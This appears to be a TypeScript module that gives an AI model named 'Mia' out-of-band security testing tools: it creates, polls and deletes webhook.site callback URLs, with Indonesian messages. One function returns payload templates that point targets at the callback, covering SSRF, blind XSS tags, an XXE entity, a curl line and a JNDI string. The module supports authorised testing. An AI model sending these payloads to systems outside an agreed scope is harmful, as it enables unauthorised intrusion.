// Out-of-band testing (OAST) — keyless via webhook.site. Lets Mia CONFIRM blind
// bugs (SSRF, blind XSS/XXE/RCE, SQLi-OOB over HTTP) by handing the target a
// unique callback URL and polling what actually hit it.
//
// This module only talks to webhook.site (not the target) — the target is hit by
// the exploit Mia sends via her scoped tools. Per-user token at
// .data/users/<user>/oast.json.
import { mkdirSync, readFileSync, renameSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { sanitizeUser, userDataRoot } from "./users";

type Oast = { uuid: string; url: string; createdAt: string };
type OastStore = { current?: Oast };
type WsRequest = { method?: string; url?: string; ip?: string; created_at?: string; user_agent?: string; headers?: Record<string, string>; content?: string; query?: Record<string, string> };

function storePath(userKey: string): string {
  return join(userDataRoot(), userKey, "oast.json");
}
function readStore(rawUser: unknown): { userKey: string; store: OastStore } | null {
  const userKey = sanitizeUser(rawUser);
  if (!userKey) return null;
  try {
    const j = JSON.parse(readFileSync(storePath(userKey), "utf8"));
    return { userKey, store: j && typeof j === "object" ? (j as OastStore) : {} };
  } catch {
    return { userKey, store: {} };
  }
}
function writeStore(userKey: string, store: OastStore): void {
  const file = storePath(userKey);
  mkdirSync(dirname(file), { recursive: true });
  const tmp = `${file}.tmp`;
  writeFileSync(tmp, JSON.stringify(store, null, 2));
  renameSync(tmp, file);
}
async function ws<T>(url: string, init?: RequestInit, timeoutMs = 15_000): Promise<T | null> {
  try {
    const res = await fetch(url, { ...init, headers: { "User-Agent": "mia-assistant/1.0", ...(init?.headers || {}) }, signal: AbortSignal.timeout(timeoutMs) });
    if (!res.ok) return null;
    return (await res.json()) as T;
  } catch {
    return null;
  }
}

/** Create (or refresh) this user's OAST callback URL. */
export async function oastCreate(rawUser: unknown): Promise<string> {
  const s = readStore(rawUser);
  if (!s) return "Error: invalid user";
  const j = await ws<{ uuid?: string }>("https://webhook.site/token", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" }, 20_000);
  if (!j?.uuid) return "Error: gagal membuat token OAST (webhook.site tidak terjangkau).";
  const url = `https://webhook.site/${j.uuid}`;
  writeStore(s.userKey, { current: { uuid: j.uuid, url, createdAt: new Date().toISOString() } });
  return [
    `🎣 OAST aktif — callback unik: ${url}`,
    "",
    "Pakai URL ini di payload blind (target harus memanggil balik):",
    `• SSRF: http://target/fetch?url=${url}`,
    `• Blind XSS: <script src="${url}/x.js"></script> atau "><img src=${url}?c=1>`,
    `• XXE: <!ENTITY x SYSTEM "${url}/xxe">`,
    `• RCE/SSTI: curl ${url}/rce ; \${jndi:ldap://...}`,
    "",
    "Kirim payload lewat tool ber-scope (http_request/lab_fetch), lalu cek hasilnya dengan `oast_poll`.",
  ].join("\n");
}

/** Poll the callback for anything that hit it. */
export async function oastPoll(rawUser: unknown): Promise<string> {
  const s = readStore(rawUser);
  if (!s) return "Error: invalid user";
  const cur = s.store.current;
  if (!cur) return "Belum ada OAST aktif — jalankan `oast_create` dulu.";
  const j = await ws<{ total?: number; data?: WsRequest[] }>(`https://webhook.site/token/${cur.uuid}/requests?sorting=newest`, undefined, 20_000);
  if (!j) return `Error: gagal polling ${cur.uuid} (webhook.site tidak terjangkau).`;
  const rows = (j.data || []).slice(0, 25);
  if (!rows.length) return `🎣 OAST ${cur.url} — belum ada interaksi (0 hit). Kalau target blind, cek lagi nanti / pastikan payload benar-benar terkirim.`;
  const fmt = rows
    .map((r) => {
      const q = r.query && Object.keys(r.query).length ? `?${new URLSearchParams(r.query).toString()}` : "";
      const ct = r.headers?.["content-type"] || "";
      const body = r.content ? `\n   body: ${String(r.content).replace(/\s+/g, " ").slice(0, 200)}` : "";
      return `• [${r.method || "?"}] ${r.created_at || ""} from ${r.ip || "?"} — ${(r.url || "").slice(0, 120)}${ct ? ` (${ct})` : ""}${body}`;
    })
    .join("\n");
  return `🎣 OAST ${cur.url} — ${j.total ?? rows.length} interaksi (${rows.length} terbaru):\n${fmt}\n\n⚠️ Hit = bukti OOB. Catat sebagai finding (evidence: request ini) sebelum lapor.`;
}

/** Delete the remote token and clear the local pointer. */
export async function oastStop(rawUser: unknown): Promise<string> {
  const s = readStore(rawUser);
  if (!s) return "Error: invalid user";
  const cur = s.store.current;
  if (!cur) return "Tidak ada OAST aktif.";
  await ws(`https://webhook.site/token/${cur.uuid}`, { method: "DELETE" }, 15_000);
  writeStore(s.userKey, {});
  return `🛑 OAST ${cur.uuid} dihapus.`;
}
